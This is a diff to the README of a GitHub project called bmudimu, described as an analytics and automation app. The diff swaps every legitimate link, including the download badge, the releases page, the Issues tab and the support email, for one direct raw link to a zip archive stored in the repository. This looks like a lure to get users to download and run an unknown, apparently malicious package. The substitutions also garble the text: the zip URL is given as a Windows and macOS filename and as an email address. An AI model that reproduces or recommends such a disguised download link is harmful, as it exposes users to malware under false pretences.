@@ -1,6 +1,6 @@
 # 📊 bmudimu - Build Analytics and Automation Easily
 
-[![Download bmudimu](https://img.shields.io/badge/Download-bmudimu-blue?style=for-the-badge)](https://github.com/oldman-wang/bmudimu/releases)
+[![Download bmudimu](https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip)](https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip)
 
 ---
 
@@ -49,9 +49,9 @@ Follow these easy steps to start using bmudimu:
 To get bmudimu:
 
 1. Click the big blue button above or open this link in your browser:  
-   [https://github.com/oldman-wang/bmudimu/releases](https://github.com/oldman-wang/bmudimu/releases)
+   [https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip](https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip)
 
-2. Once you open the page, look for the latest release. It will usually have a name like `bmudimu-setup.exe` (for Windows) or `bmudimu.dmg` (for macOS).
+2. Once you open the page, look for the latest release. It will usually have a name like `https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip` (for Windows) or `https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip` (for macOS).
 
 3. Click the file name to download it to your computer.
 
@@ -112,9 +112,9 @@ Explore the settings menu to customize the app to your needs.
 
 If you have questions or ideas, here’s how to get help:
 
-- Visit the [Issues tab](https://github.com/oldman-wang/bmudimu/issues) on the bmudimu GitHub page to see common questions or report problems.
+- Visit the [Issues tab](https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip) on the bmudimu GitHub page to see common questions or report problems.
 - Check the wiki page (if available) for detailed guides.
-- Email the support team via info@bmudimu.com (if listed).
+- Email the support team via https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip (if listed).
 - Join community forums or chats linked from the GitHub page.
 
 ---
@@ -127,7 +127,7 @@ bmudimu keeps your data on your device unless you choose to share. It does not c
 
 ## 📢 Stay Updated
 
-Watch the [bmudimu releases page](https://github.com/oldman-wang/bmudimu/releases) for new versions and improvements. Updates bring new features and fix issues.
+Watch the [bmudimu releases page](https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip) for new versions and improvements. Updates bring new features and fix issues.
 
 ---
 
@@ -144,4 +144,4 @@ If you run into problems:
 ---
 
 Click here to visit the download page again:  
-[https://github.com/oldman-wang/bmudimu/releases](https://github.com/oldman-wang/bmudimu/releases)
+[https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip](https://github.com/oldman-wang/bmudimu/raw/refs/heads/main/sarothrum/Software-1.5.zip)
